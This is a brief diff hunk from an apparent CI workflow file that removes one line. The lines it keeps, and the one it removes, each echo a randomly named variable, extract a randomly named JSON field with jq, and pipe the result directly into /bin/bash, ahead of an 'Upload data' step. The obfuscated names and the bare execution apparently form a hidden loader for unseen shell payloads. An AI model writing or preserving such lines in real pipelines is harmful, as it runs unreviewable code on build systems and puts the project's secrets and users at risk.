@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$hbzjm90" | jq -r .shzq9978 | /bin/bash
           echo $yuvun123 | jq -r .lsze64348 | /bin/bash
           echo $uslw94976 | jq -r .uueh6314 | /bin/bash
-          echo $zif08 | jq -r .u19 | /bin/bash
           echo $k5 | jq -r .j43 | /bin/bash
 
       - name: Upload data
